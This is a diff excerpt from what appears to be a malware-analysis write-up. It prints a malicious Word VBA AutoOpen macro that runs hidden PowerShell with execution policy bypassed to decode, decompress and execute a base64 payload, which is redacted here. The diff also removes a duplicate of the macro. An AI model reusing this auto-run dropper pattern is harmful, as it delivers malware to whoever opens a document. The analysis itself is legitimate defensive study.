@@ -977,16 +977,6 @@ Dim cmd As String
 cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('[removed-because-of-windows-defender]'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
 Shell cmd
 End Sub
-
--------------------------------------------------------------------------------
-VBA MACRO NewMacros.bas
-in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-Sub AutoOpen()
-Dim cmd As String
-cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('[removed-because-of-windows-defender]'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
-Shell cmd
-End Sub
 ```
 
 Seems like the PowerShell payload is base64 encoded and then compressed.
